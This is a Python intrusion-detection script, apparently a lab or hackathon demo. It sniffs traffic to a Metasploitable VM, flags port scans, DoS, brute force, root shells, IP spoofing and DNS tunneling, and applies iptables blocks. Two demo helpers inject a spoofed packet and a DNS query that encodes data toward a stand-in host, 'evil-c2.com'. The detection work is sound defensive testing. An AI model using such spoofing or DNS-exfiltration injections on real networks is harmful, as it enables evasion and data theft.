#!/usr/bin/env python3
"""
OVERSEER — Parrot Bridge v5
============================
Detection modules:
  - Port Scan (nmap, masscan)
  - DoS / DDoS (hping3, LOIC)
  - Brute Force (Hydra, Medusa)
  - Root Shell (bindshell, netcat)
  - IP Spoofing (spoofed source IPs)
  - DNS Tunneling (data exfil via DNS)

SOAR: real iptables blocking on detection

USAGE:  sudo python3 parrot_bridge.py
"""

import time
import threading
import subprocess
import requests
import math
import collections
from datetime import datetime
from scapy.all import sniff, IP, TCP, UDP, ICMP, DNS, DNSQR

# ── CONFIG ────────────────────────────────────────────────────────────────────
IFACE       = "enp0s3"
TARGET      = "192.168.56.101"    # Metasploitable
ATTACKER    = "192.168.56.102"    # Parrot (self)
WINDOWS_IP  = "192.168.56.1"      # Windows host running OVERSEER
API         = f"http://{WINDOWS_IP}:5000/predict"
SUBNET      = "192.168.56."

FLOW_TIMEOUT    = 4.0
MIN_PACKETS     = 3
SCORE_INTERVAL  = 1.5
MAX_FLOWS       = 1500
MAX_API_THREADS = 8
ALERT_COOLDOWN  = 15.0  # 15s between same-family alerts from same source

# ── Shared state ──────────────────────────────────────────────────────────────
flows        = {}
last_score   = {}
lock         = threading.Lock()
API_SEM      = threading.Semaphore(MAX_API_THREADS)
port_tracker = {}
port_lock    = threading.Lock()
blocked_ips  = set()
blocked_lock = threading.Lock()
last_alert   = {}
stats        = {"pkts":0,"scored":0,"threats":0,"blocked":0,"t0":time.time()}

# ── Protocol maps ─────────────────────────────────────────────────────────────
SERVICE_MAP = {
    80:3, 443:3, 8080:3, 8180:3,
    22:7, 21:5, 2121:5, 23:19,
    25:15, 53:4, 3306:20, 5432:21,
    139:12, 445:12, 1524:8, 6667:10,
    512:8, 513:8, 514:8,
}
PROTO_MAP = {"tcp":6, "udp":2, "icmp":1}

# ── IP Spoofing config ────────────────────────────────────────────────────────
VALID_IPS      = {"192.168.56.1","192.168.56.101","192.168.56.102"}
spoof_alerts   = {}
SPOOF_COOLDOWN = 10.0

# ── DNS Tunneling config ──────────────────────────────────────────────────────
dns_query_log       = collections.defaultdict(list)
dns_lock            = threading.Lock()
dns_alerts          = {}
DNS_COOLDOWN        = 10.0
DNS_ENTROPY_THRESH  = 3.8   # high = random/encoded
DNS_LENGTH_THRESH   = 40    # long subdomain = data encoded
DNS_RATE_THRESH     = 10    # queries per 5s


# ══════════════════════════════════════════════════════════════════════════════
# SOAR — iptables blocking
# ══════════════════════════════════════════════════════════════════════════════
def block_ip(ip, reason):
    """Block Parrot's connection to/from ip."""
    with blocked_lock:
        if ip in blocked_ips:
            return
        blocked_ips.add(ip)
    try:
        subprocess.run(["iptables","-I","OUTPUT","1","-d",ip,"-j","DROP"],
                       check=True, capture_output=True)
        subprocess.run(["iptables","-I","INPUT","1","-s",ip,"-j","DROP"],
                       check=True, capture_output=True)
        stats["blocked"] += 1
        ts = datetime.now().strftime("%H:%M:%S")
        print(f"\n  [SOAR] [{ts}] BLOCKED {ip} — {reason}")
        print(f"         To unblock: sudo iptables -F INPUT && sudo iptables -F OUTPUT\n")
    except Exception as e:
        print(f"  [!] Block failed for {ip}: {e}")


def unblock_all():
    with blocked_lock:
        for ip in blocked_ips:
            subprocess.run(["iptables","-D","OUTPUT","-d",ip,"-j","DROP"], capture_output=True)
            subprocess.run(["iptables","-D","INPUT","-s",ip,"-j","DROP"],  capture_output=True)
        blocked_ips.clear()


# ══════════════════════════════════════════════════════════════════════════════
# ADVANCED THREAT: IP Spoofing Detection
# ══════════════════════════════════════════════════════════════════════════════
def check_ip_spoofing(pkt):
    """
    Detect packets with source IPs that don't belong on this network.
    On a host-only network, all IPs must be 192.168.56.x
    Any packet from an external IP is spoofed.
    """
    if not pkt.haslayer(IP):
        return
    src = pkt[IP].src
    dst = pkt[IP].dst

    # External source on internal interface = spoofed
    if not src.startswith(SUBNET) and (dst.startswith(SUBNET) or dst == TARGET):
        now = time.time()
        key = f"spoof_{src}"
        if now - spoof_alerts.get(key, 0) > SPOOF_COOLDOWN:
            spoof_alerts[key] = now
            stats["threats"] += 1
            ts = datetime.now().strftime("%H:%M:%S")
            print(f"\n{'━'*56}")
            print(f"  🔴 IP SPOOFING DETECTED  [{ts}]")
            print(f"  Spoofed src : {src}")
            print(f"  Target      : {dst}")
            print(f"  Indicator   : External IP on internal host-only interface")
            print(f"  SOAR        : BLOCK_IP, ALERT_SOC")
            print(f"{'━'*56}\n")
            threading.Thread(
                target=block_ip, args=(src, "IP spoofing"), daemon=True
            ).start()
            threading.Thread(
                target=report_threat,
                args=("IP Spoofing", src, dst, 0.96,
                      ["BLOCK_IP","ALERT_SOC"],
                      f"External IP {src} on internal interface"),
                daemon=True
            ).start()


# ══════════════════════════════════════════════════════════════════════════════
# ADVANCED THREAT: DNS Tunneling Detection
# ══════════════════════════════════════════════════════════════════════════════
def shannon_entropy(s):
    """Shannon entropy — high value means data looks random/encoded."""
    if not s:
        return 0.0
    freq = collections.Counter(s)
    length = len(s)
    return -sum((c / length) * math.log2(c / length) for c in freq.values())


def check_dns_tunneling(pkt):
    """
    DNS tunneling encodes data in DNS query names.
    Indicators:
      1. Long subdomain (data encoded as base64/hex)
      2. High Shannon entropy (random-looking characters)
      3. High query rate (many DNS requests rapidly)
    """
    if not pkt.haslayer(IP):
        return
    if not pkt.haslayer(UDP):
        return
    if pkt[UDP].dport != 53:
        return
    if not pkt.haslayer(DNS):
        return

    src = pkt[IP].src
    dns = pkt[DNS]

    # Only inspect queries not responses
    if dns.qr != 0:
        return
    if not dns.qd:
        return

    try:
        query = dns.qd.qname.decode("utf-8", errors="ignore").rstrip(".")
    except Exception:
        return

    # Extract subdomain (strip last 2 parts = domain + TLD)
    parts = query.split(".")
    subdomain = ".".join(parts[:-2]) if len(parts) > 2 else query
    clean_sub = subdomain.replace(".", "")

    query_len = len(clean_sub)
    entropy   = shannon_entropy(clean_sub)

    indicators = []
    if query_len > DNS_LENGTH_THRESH:
        indicators.append(f"long query ({query_len} chars)")
    if entropy > DNS_ENTROPY_THRESH:
        indicators.append(f"high entropy ({entropy:.2f})")

    # Track query rate per source
    now = time.time()
    with dns_lock:
        dns_query_log[src].append(now)
        dns_query_log[src] = [t for t in dns_query_log[src] if now - t < 5.0]
        rate = len(dns_query_log[src])

    if rate > DNS_RATE_THRESH:
        indicators.append(f"high rate ({rate} queries/5s)")

    if indicators:
        if now - dns_alerts.get(src, 0) > DNS_COOLDOWN:
            dns_alerts[src] = now
            stats["threats"] += 1
            ts = datetime.now().strftime("%H:%M:%S")
            print(f"\n{'━'*56}")
            print(f"  🔴 DNS TUNNELING DETECTED  [{ts}]")
            print(f"  Source     : {src}")
            print(f"  Query      : {query[:55]}{'...' if len(query)>55 else ''}")
            print(f"  Indicators : {', '.join(indicators)}")
            print(f"  SOAR       : BLOCK_IP, LOG_ENHANCED, ALERT_SOC")
            print(f"{'━'*56}\n")
            threading.Thread(
                target=block_ip, args=(TARGET, "DNS tunneling"), daemon=True
            ).start()
            threading.Thread(
                target=report_threat,
                args=("DNS Tunneling", src, "DNS:53", 0.91,
                      ["BLOCK_IP","LOG_ENHANCED","ALERT_SOC"],
                      ", ".join(indicators)),
                daemon=True
            ).start()


# ══════════════════════════════════════════════════════════════════════════════
# Report threat to OVERSEER dashboard
# ══════════════════════════════════════════════════════════════════════════════
def report_threat(family, src, dst, score, soar, detail):
    """Push advanced threat to OVERSEER dashboard via report_threat endpoint."""
    payload = {
        "attack_family": family,
        "src": str(src), "dst": str(dst),
        "threat_score": score,
        "soar_actions": soar,
        "detail": detail,
        "timestamp": time.time()
    }
    # Try report_threat endpoint first
    try:
        r = requests.post(
            f"http://{WINDOWS_IP}:5000/report_threat",
            json=payload, timeout=2
        )
        if r.status_code == 200:
            return
    except Exception:
        pass
    # Fallback: use predict_demo to push a matching scenario to dashboard
    # Don't use predict_demo fallback — it maps to wrong families.
    # Instead push directly into stats via a custom alert injection.
    # The dashboard polls /stats every 1s and will pick this up.
    try:
        requests.post(
            f"http://{WINDOWS_IP}:5000/inject_alert",
            json=payload, timeout=2
        )
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════════
# Flow tracking
# ══════════════════════════════════════════════════════════════════════════════
def new_flow(proto, dport):
    return {
        "proto":proto, "dport":dport,
        "src_bytes":0, "dst_bytes":0,
        "pkts":0, "t0":time.time(), "t_last":time.time(),
        "syn":0, "ack":0, "rst":0, "fin":0,
        "hot":0, "failed_logins":0,
        "serr":0, "rerr":0,
    }


def handle(pkt):
    try:
        if not pkt.haslayer(IP): return
        src = pkt[IP].src
        dst = pkt[IP].dst

        # Only traffic to/from Metasploitable
        if dst != TARGET and src != TARGET: return
        # Drop broadcasts/multicast
        if dst.endswith(".255") or dst.startswith("224."): return

        # ── Advanced threat checks ────────────────────────────────────────
        check_ip_spoofing(pkt)
        check_dns_tunneling(pkt)

        stats["pkts"] += 1

        proto = "tcp"
        dport = 0
        sport = 0
        syn = ack = rst = fin = False

        if pkt.haslayer(TCP):
            dport = pkt[TCP].dport
            sport = pkt[TCP].sport
            f     = pkt[TCP].flags
            syn   = bool(f & 0x02)
            ack   = bool(f & 0x10)
            rst   = bool(f & 0x04)
            fin   = bool(f & 0x01)
        elif pkt.haslayer(UDP):
            proto = "udp"
            dport = pkt[UDP].dport
            sport = pkt[UDP].sport
        elif pkt.haslayer(ICMP):
            proto = "icmp"
        else:
            return

        # Normalize: attacker is always non-target
        if src == TARGET:
            attacker  = dst
            flow_port = sport
        else:
            attacker  = src
            flow_port = dport

        key = (attacker, TARGET, flow_port, proto)

        # Port tracker for fast scan detection
        with port_lock:
            if attacker not in port_tracker:
                port_tracker[attacker] = set()
            port_tracker[attacker].add(flow_port)
            if len(port_tracker[attacker]) == 15:
                print(f"\n  FAST BLOCK: {attacker} hit 15 unique ports — blocking now")
                threading.Thread(
                    target=block_ip,
                    args=(TARGET, "port scan early detection"),
                    daemon=True
                ).start()

        with lock:
            if len(flows) > MAX_FLOWS:
                return
            if key not in flows:
                flows[key] = new_flow(proto, flow_port)
            fl = flows[key]
            fl["pkts"]  += 1
            fl["t_last"] = time.time()

            plen = len(pkt)
            if src != TARGET: fl["src_bytes"] += plen
            else:             fl["dst_bytes"] += plen

            if syn: fl["syn"] += 1
            if ack: fl["ack"] += 1
            if rst: fl["rst"] += 1; fl["rerr"] += 1
            if fin: fl["fin"] += 1
            if syn and not ack and dst == TARGET: fl["serr"] += 1
            if flow_port in [22,23,1524,512,513,514]: fl["hot"] += 1
            if flow_port == 22 and syn and not ack:   fl["failed_logins"] += 1

            if fl["pkts"] >= MIN_PACKETS:
                _try_score(key, fl)

    except Exception:
        pass


def _try_score(key, fl):
    now = time.time()
    if now - last_score.get(key, 0) < SCORE_INTERVAL:
        return
    last_score[key] = now
    features = extract(key, fl)
    def _run():
        with API_SEM:
            call_api(key, fl, features)
    threading.Thread(target=_run, daemon=True).start()


def extract(key, fl):
    src, dst, dport, proto = key
    pkts     = max(fl["pkts"], 1)
    duration = max(fl["t_last"] - fl["t0"], 0)
    serr     = min(fl["serr"] / pkts, 1.0)
    rerr     = min(fl["rerr"] / pkts, 1.0)
    count    = min(fl["pkts"], 511)

    with port_lock:
        unique_ports = len(port_tracker.get(src, set()))

    is_scan  = unique_ports > 10
    is_flood = fl["syn"] > 50 and fl["src_bytes"] < 300 and not is_scan

    if is_flood:
        count=511; serr=1.0; rerr=0.0; same_srv=1.0; diff_srv=0.0; flag=9
    elif is_scan:
        rerr=0.99; serr=0.0; count=min(unique_ports,511)
        same_srv=0.06; diff_srv=0.07; flag=3
    else:
        same_srv=1.0; diff_srv=0.0
        flag = 3 if fl["rst"]>0 else 5

    root_shell = 1 if dport==1524 else 0
    num_shells = 1 if dport in [1524,512,513,514] else 0
    logged_in  = 1 if fl["ack"]>0 else 0

    return [
        duration, PROTO_MAP.get(proto,6), SERVICE_MAP.get(dport,7), flag,
        fl["src_bytes"], fl["dst_bytes"], 0, 0, 0,
        min(fl["hot"],10), min(fl["failed_logins"],10), logged_in,
        root_shell, root_shell, 0, root_shell, 0, num_shells, 0, 0, 0, 0,
        count, count, serr, serr, rerr, rerr, same_srv, diff_srv, 0.0,
        min(count,255), min(count,255), same_srv, diff_srv,
        1.0 if count>50 else 0.1, 0.0, serr, serr, rerr, rerr,
    ]


def call_api(key, fl, features):
    src, dst, dport, proto = key
    try:
        r = requests.post(API, json={"features":features}, timeout=2)
        if r.status_code != 200: return
        res    = r.json()
        score  = res.get("threat_score", 0)
        family = res.get("attack_family", "BENIGN")
        threat = res.get("is_threat", False)
        soar   = res.get("soar_actions", [])
        ts     = datetime.now().strftime("%H:%M:%S")
        top    = res.get("xai_top_features",[{}])[0].get("feature","?")
        stats["scored"] += 1

        if threat:
            now = time.time()
            alert_key = f"{src}-{family}"
            if now - last_alert.get(alert_key, 0) < ALERT_COOLDOWN:
                return
            last_alert[alert_key] = now
            stats["threats"] += 1
            print(f"\n{'━'*56}")
            print(f"  🔴 THREAT  [{ts}]  score={score:.3f}")
            print(f"  Family  : {family}")
            print(f"  Flow    : {src} -> {dst}:{dport} ({proto.upper()})")
            print(f"  SOAR    : {', '.join(soar)}")
            print(f"  XAI     : {top}")
            print(f"{'━'*56}")

            if "BLOCK_IP" in soar:
                threading.Thread(
                    target=block_ip, args=(TARGET, family), daemon=True
                ).start()

            if "RATE_LIMIT" in soar:
                try:
                    subprocess.run([
                        "iptables","-I","INPUT","1",
                        "-s",TARGET,"-m","limit",
                        "--limit","10/sec","-j","ACCEPT"
                    ], capture_output=True)
                    print(f"  RATE_LIMIT applied to {TARGET}")
                except Exception:
                    pass

            if "RESET_SESSION" in soar:
                try:
                    subprocess.run([
                        "iptables","-I","INPUT","1",
                        "-s",TARGET,"-p","tcp",
                        "-j","REJECT","--reject-with","tcp-reset"
                    ], capture_output=True)
                    print(f"  RESET_SESSION applied to {TARGET}")
                except Exception:
                    pass
            print()
        else:
            if score > 0.2:
                print(f"  [{ts}] BENIGN {score:.3f}  {src}->{dst}:{dport}")

    except requests.exceptions.ConnectionError:
        pass
    except Exception:
        pass


def cleanup():
    last_reset = time.time()
    while True:
        time.sleep(3)
        now = time.time()
        with lock:
            dead = [k for k,f in flows.items() if now-f["t_last"]>FLOW_TIMEOUT]
            for k in dead:
                del flows[k]; last_score.pop(k,None)
        if now - last_reset > 30:
            with port_lock:
                port_tracker.clear()
            last_reset = now


def print_stats():
    while True:
        time.sleep(20)
        up = int(time.time() - stats["t0"])
        print(f"\n  [stats] {up}s | pkts={stats['pkts']} | "
              f"scored={stats['scored']} | threats={stats['threats']} | "
              f"blocked={stats['blocked']} | flows={len(flows)}\n")


# ══════════════════════════════════════════════════════════════════════════════
# Demo helpers — simulate IP spoofing and DNS tunneling for judges
# ══════════════════════════════════════════════════════════════════════════════
def demo_ip_spoof():
    """Inject a fake spoofed packet for demo purposes."""
    from scapy.all import IP, TCP, send
    print("\n  [DEMO] Injecting spoofed packet from 10.0.0.99...")
    try:
        pkt = IP(src="10.0.0.99", dst=TARGET) / TCP(dport=80, flags="S")
        send(pkt, iface=IFACE, verbose=False)
        print("  [DEMO] Spoofed packet sent — watch for IP SPOOFING alert")
    except Exception as e:
        print(f"  [DEMO] Could not inject: {e}")


def demo_dns_tunnel():
    """Inject a fake DNS tunneling query for demo purposes."""
    from scapy.all import IP, UDP, DNS, DNSQR, send
    # Simulate a tunneled query — long base64-looking subdomain
    tunnel_query = "aGVsbG8td29ybGQtdGhpcy1pcy1kYXRhLWV4ZmlsdHJhdGlvbg.evil-c2.com."
    print(f"\n  [DEMO] Injecting DNS tunneling query: {tunnel_query[:40]}...")
    try:
        pkt = (IP(src=ATTACKER, dst=TARGET) /
               UDP(dport=53) /
               DNS(rd=1, qd=DNSQR(qname=tunnel_query)))
        send(pkt, iface=IFACE, verbose=False)
        print("  [DEMO] DNS tunnel query sent — watch for DNS TUNNELING alert")
    except Exception as e:
        print(f"  [DEMO] Could not inject: {e}")


# ══════════════════════════════════════════════════════════════════════════════
# Main
# ══════════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    import sys

    print("\n" + "="*56)
    print("  OVERSEER — Parrot Bridge v5")
    print("  Port Scan | DoS | Brute Force | Root Shell")
    print("  IP Spoofing | DNS Tunneling")
    print("="*56)

    # Demo mode flags
    if "--demo-spoof" in sys.argv:
        demo_ip_spoof()
        sys.exit(0)
    if "--demo-dns" in sys.argv:
        demo_dns_tunnel()
        sys.exit(0)

    try:
        requests.get(f"http://{WINDOWS_IP}:5000/health", timeout=3)
        print(f"[OK] OVERSEER reachable at {WINDOWS_IP}:5000")
    except Exception:
        print(f"[!] Cannot reach OVERSEER at {WINDOWS_IP}:5000")
        input("    Press Enter to continue anyway...")

    print(f"[OK] Interface : {IFACE}")
    print(f"[OK] Target    : {TARGET}  (Metasploitable)")
    print(f"[OK] Attacker  : {ATTACKER}  (Parrot)")
    print(f"[OK] API       : {API}")
    print(f"[OK] SOAR      : iptables blocking ENABLED")
    print(f"[OK] Advanced  : IP Spoofing + DNS Tunneling detection ACTIVE")
    print(f"\n[*] LIVE — run attacks now!")
    print(f"    Demo spoof:  sudo python3 parrot_bridge.py --demo-spoof")
    print(f"    Demo DNS:    sudo python3 parrot_bridge.py --demo-dns\n")

    threading.Thread(target=cleanup,     daemon=True).start()
    threading.Thread(target=print_stats, daemon=True).start()

    try:
        sniff(
            iface=IFACE,
            prn=handle,
            filter=f"host {TARGET} or (udp port 53)",
            store=False
        )
    except KeyboardInterrupt:
        print("\n[*] Shutting down — removing iptables rules...")
        unblock_all()
        print("[OK] Cleanup done.")
    except Exception as e:
        print(f"\n[!] Error: {e}")
